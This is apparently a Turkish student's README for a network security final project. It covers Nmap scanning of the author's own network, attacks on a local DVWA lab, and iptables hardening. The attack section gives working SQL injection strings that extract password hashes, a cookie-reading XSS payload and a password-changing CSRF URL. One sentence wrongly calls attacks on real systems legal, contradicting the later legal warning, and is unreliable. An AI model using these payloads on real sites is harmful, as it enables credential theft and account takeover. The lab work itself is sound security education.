# 🛡️ Bilgisayar Ağ Güvenliği — Final Projesi
### Tam Sızma Testi Simülasyonu: Keşif → Saldırı → Savunma

**Ömer Faruk Özgür** · `22430070048` · Bilişim Sistemleri ve Teknolojileri, 4. Sınıf · Mayıs 2026

---

## 📋 Proje Özeti

Bu proje, gerçek dünya **penetration testing (sızma testi)** akışını üç aşamada simüle etmektedir:

| Aşama | Araç | Kapsam |
|-------|------|--------|
| 🔵 **Keşif** | Nmap 7.99 + Wireshark | Host keşfi, port tarama, OS tespiti, paket analizi |
| 🔴 **Saldırı** | DVWA | SQL Injection, Blind SQLi, Reflected/Stored XSS, CSRF |
| 🟢 **Savunma** | iptables | Güvenlik duvarı kuralları, SYN flood koruması, loglama |

Bunlara ek olarak projeye **Flask tabanlı canlı ağ tarama API'si** ve etkileşimli bir **HTML rapor dashboard'u** eklenmiştir.

---

## 📁 Repo Yapısı

```
.
├── ag_tarama_server.py     # Flask + python-nmap ile canlı ağ tarama sunucusu
├── Final_Projesi.html      # Etkileşimli HTML rapor & ağ topolojisi dashboard'u
├── docs/
│   └── metodoloji.md       # Sızma testi adım adım metodoloji notları
└── README.md
```

> **Not:** `nmap_tarama.pcapng` gibi ham ağ trafiği kayıtları `.gitignore` ile dışlanmıştır.

---

## ⚙️ Kurulum ve Çalıştırma

### Gereksinimler

```bash
pip install flask flask-cors python-nmap
# Ayrıca sistemde Nmap kurulu olmalı:
# Windows: https://nmap.org/download.html
# Linux:   sudo apt install nmap
```

### Sunucuyu başlat

```bash
# Linux/macOS (root gerekli — raw socket için)
sudo python ag_tarama_server.py

# Windows (Yönetici olarak çalıştır)
python ag_tarama_server.py
```

Sunucu `http://localhost:5000` adresinde ayağa kalkar.

### HTML Dashboard

`Final_Projesi.html` dosyasını herhangi bir tarayıcıda açın.  
Canlı tarama özelliği için `ag_tarama_server.py`'nin çalışıyor olması gerekir.

---

## 🔌 API Endpointleri

| Endpoint | Metot | Açıklama |
|----------|-------|----------|
| `/` | GET | Sunucu durumu ve endpoint listesi |
| `/info` | GET | Yerel IP, ağ aralığı, Nmap sürümü |
| `/scan/hosts` | GET | Ağdaki aktif cihazları tara (ping sweep) |
| `/scan/ports/<ip>` | GET | Belirli bir IP'nin port ve servislerini tara |
| `/scan/full` | GET | Tam tarama — host + port bilgisi birlikte |

**Örnek çıktı (`/scan/hosts`):**

```json
{
  "success": true,
  "network": "192.168.X.0/24",
  "host_count": 4,
  "hosts": [
    {
      "ip": "192.168.X.1",
      "hostname": "",
      "status": "up",
      "mac": "AA:BB:CC:DD:EE:01",
      "vendor": "Huawei Technologies"
    }
  ]
}
```

---

## 🔍 Aşama 1 — Keşif (Nmap)

### 1.1 Host Keşfi

```bash
nmap -sn 192.168.X.0/24
```

256 IP adresini ICMP ping sweep ile tarar; aktif cihazları tespit eder.

**Tespit edilen cihazlar (anonimleştirilmiş):**

| IP | Cihaz Tipi | Risk |
|----|-----------|------|
| 192.168.X.1 | Router/Modem | Orta |
| 192.168.X.2 | Telefon/Tablet | Düşük |
| 192.168.X.3 | TV Kutusu | **Kritik** (Telnet açık) |
| 192.168.X.4 | iPhone | Orta |
| 192.168.X.7 | Test Bilgisayarı | — |

### 1.2 Port ve Servis Tarama

```bash
nmap -sV --top-ports 1000 <hedef-ip-listesi> -oX tarama.xml
```

**Kritik bulgular:**

| IP | Port | Servis | Güvenlik Notu |
|----|------|--------|---------------|
| X.1 | 80/tcp | HTTP | Modem yönetim paneli — dış erişime açık! |
| X.3 | 23/tcp | Telnet | **KRİTİK** — Şifresiz, şifrelenmemiş protokol |
| X.4 | 49152/tcp | UPnP | Orta risk |

### 1.3 OS Tespiti

```bash
nmap -O --script http-headers,smb-security-mode <ip>
```

| Cihaz | Tespit Edilen OS | Güven |
|-------|-----------------|-------|
| Router | Linux 2.6.x (Embedded) | %97 |
| TV Kutusu | Linux 2.6.32–3.10 | %95 |

### 1.4 Paket Yakalama (Wireshark)

Nmap taraması sırasında Wireshark ile ağ trafiği kaydedildi:

| Parametre | Değer |
|-----------|-------|
| Toplam paket | 4.374 |
| TCP | 947 |
| UDP | 46 |
| Nmap tarama paketi | 2.389 |
| Süre | 47.79 saniye |

---

## 💀 Aşama 2 — Saldırı (DVWA)

DVWA (Damn Vulnerable Web Application) kasıtlı olarak zafiyetli tasarlanmış bir web uygulamasıdır; gerçek sistemlere saldırı **yasaldır** ve bu projede kullanılmamıştır.

```bash
docker run -d -p 8080:80 vulnerables/web-dvwa
```

### 2.1 UNION SQL Injection

```sql
-- Kolon sayısı tespiti
1' ORDER BY 2#

-- Veritabanı adı
' UNION SELECT database(),user()#

-- Tablo listesi
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#

-- Şifre hash'leri
' UNION SELECT user,password FROM users#
```

Sonuç: `users` tablosundaki 5 kullanıcının MD5 hash'leri ele geçirildi.

### 2.2 Blind SQL Injection

```sql
1' AND 1=1#          -- TRUE → "User ID exists"
1' AND 1=2#          -- FALSE → boş yanıt
1' AND database()='dvwa'#  -- Veritabanı adı doğrulandı
```

### 2.3 XSS (Reflected & Stored)

```html
<script>alert(document.cookie)</script>
```

**Reflected XSS:** Cookie bilgisi popup'ta görüntülendi.  
**Stored XSS:** Script veritabanına kaydedildi, her sayfada tetikleniyor.

### 2.4 CSRF

Form doldurmadan sadece URL ile şifre değiştirildi:

```
http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

---

## 🛡️ Aşama 3 — Savunma (iptables)

Docker üzerinde Ubuntu 22.04 container'ı kullanıldı:

```bash
docker run -it --privileged --name ubuntu-fw ubuntu:22.04 bash
apt-get install -y iptables
```

### Uygulanan Kurallar

```bash
# 1. Telnet'i tamamen engelle
iptables -A INPUT -p tcp --dport 23 -j DROP

# 2. HTTP'yi sadece yerel ağa kısıtla
iptables -A INPUT -p tcp --dport 80 ! -s 192.168.X.0/24 -j DROP

# 3. SYN flood sınırla
iptables -A INPUT -p tcp --tcp-flags ALL SYN -m limit --limit 1/s -j ACCEPT

# 4. Kalan SYN paketlerini düşür (port taraması engelle)
iptables -A INPUT -p tcp --tcp-flags ALL SYN -j DROP

# Kuralları kaydet
iptables-save > /etc/iptables.rules
```

### DROP Yeterli mi? — Loglama Gerekliliği

Sessiz DROP yerine önce logla, sonra düşür:

```bash
iptables -A INPUT -p tcp --dport 23 -j LOG --log-prefix "TELNET_BLOCKED: "
iptables -A INPUT -p tcp --dport 23 -j DROP
```

Merkezi log yönetimi için `fail2ban` + `rsyslog` + SIEM entegrasyonu önerilir.

---

## 📊 Zafiyet Özet Raporu

| Zafiyet | CVSS | Etki | Öneri |
|---------|------|------|-------|
| Telnet Açık (Port 23) | **9.1** | Şifresiz uzaktan erişim | SSH kullan |
| HTTP Yönetim Paneli | 7.5 | Dış erişime açık | Sadece yerel ağdan erişim |
| UNION SQL Injection | **9.8** | Tüm şifre hash'leri | Prepared Statements |
| Blind SQL Injection | 8.6 | Veritabanı sızdırma | Input validation |
| Reflected XSS | 7.4 | Session hijacking | Output encoding + CSP |
| Stored XSS | 8.8 | Kalıcı, tüm kullanıcılar | Sanitization |
| CSRF | 8.1 | Şifre değişimi | CSRF token + SameSite |
| UPnP Açık | 6.5 | Dış ağ ifşası | UPnP kapat |

---

## 🧰 Kullanılan Araçlar

| Araç | Sürüm | Amaç |
|------|-------|------|
| Nmap | 7.99 | Ağ keşfi, port tarama, OS tespiti |
| Wireshark | — | Paket yakalama ve analiz |
| DVWA | Docker | Web uygulama saldırı simülasyonu |
| iptables | Ubuntu 22.04 | Güvenlik duvarı |
| Flask + python-nmap | — | Canlı tarama API sunucusu |
| Docker | — | İzole test ortamı |

---

## ⚠️ Etik ve Yasal Uyarı

Bu projede gerçekleştirilen tüm testler **izin verilen, kontrollü ortamlarda** yapılmıştır:

- Nmap taramaları yalnızca kendi ağımda gerçekleştirilmiştir.
- DVWA saldırıları yalnızca yerel Docker container'ına uygulanmıştır.
- İzinsiz sistemlere saldırı **Türk Ceza Kanunu 243–245. maddeleri** kapsamında suçtur.

---

*Bilgisayar Ağ Güvenliği Dersi — Final Projesi · Mayıs 2026*
